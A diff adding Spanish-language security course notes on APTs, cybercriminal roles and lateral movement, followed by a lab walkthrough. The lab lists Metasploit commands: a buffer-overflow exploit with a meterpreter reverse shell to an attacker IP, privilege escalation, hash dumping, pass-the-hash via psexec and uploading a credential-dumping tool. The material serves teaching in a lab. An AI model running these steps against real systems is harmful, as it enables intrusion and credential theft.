@@ -57,3 +57,59 @@ Fallo o debilidad en el diseno, la implementacion, la operacion o la gestion de 
 Que es un exploit?
 Es un fragmento de codigo, de datos , secuencia de comandos que permite explotar una vulnerabilidad.
 
+Clase 4 26-06-2019
+Ataques dirigidos y APT
+APT es amenaza avanzada persistente (Advanced Persistent Threat
+Ciberataque sofisticado, altamente dirigido, que mediante una serie de recursos, tecnicos y herramientas intenta conseguir un objetivo especifico de forma persistente y repetitiva durante un largo periodo de tiempo.
+).
+Cibercriminales organizado.
+Leader-> system administratos, asisstant.
+Programador.
+Head of the money mules service -> money mules manager ->money mules.
+
+Distributors.
+Traffic dealer.
+Spammer.
+Downloads
+
+Tecnicas y herramientas de movimiento lateral
+- Pass the hash (almacenado en cache, SAM, Isass.exe, memoria, etc)
+- explotacion de vulnerabilidades
+- robo de contrasenas.
+
+
+LABORATORIO
+Utilizamos windows y kali
+- EN windows un programa vulnerable llamado file management
+- En kali metasploid
+-Metasploit-> use exploit/windows/http/efs_fmws_userid_bof
+>set RHOST 192.168.43.120 # ip de la victima
+>set payload windows/meterpreter/reverse_tcp
+>set LHOST 192.168.43.100 #ip del atacante
+>exploit
+# Se ha conectado con tcp  reverso
+# Se abre la sesion meterpreter
+meterpreter> sysinfo #obtener informacion del sistema
+meterpreter>getuid #obtener el usuario actual
+meterpreter>getsystem #escala privilegio para ser usuario system de windows
+meterpreter>screenshot #hace un print screen de la victima y guarda en la maquina del atacante
+meterpreter>hashdump #obtiene usuarios y sus hash's
+#Estos hash se utilizaran para hacer un ataque pass-the-hash
+msf> use exploit/windows/smb/psexec
+msf exploit (psexec)>set payload windows/meterpreter/reverse_tcp
+msf exploit(psexec))>set LHOST 192.168.43.100 #atacante 
+msf exploit(psexec)>set LPORT 4444
+msf exploit(psexec)>set SMBUSER Administrator
+msf exploit(psexec)>set SMBPASS aadsfiosufsa234234slkfnsalfkjsa # colocar aqui el hash extraido anteriormente
+msf exploit(psexec)>exploit
+meterpreter>hschdump # coincide los hash de la victima 1
+meterpreter> upload /root/Desktop/wce/wce.exe c:\\windows\\system32
+C:\Windows\system32>wce.exe
+#aqui falta unos pasos para ver despues en el laboratorio
+
+
+Protegernos de ataques dirigidos
+Mitigando el movimiento lateral.
+Laboratorio online en https://labclient.labondemand.com
+
+
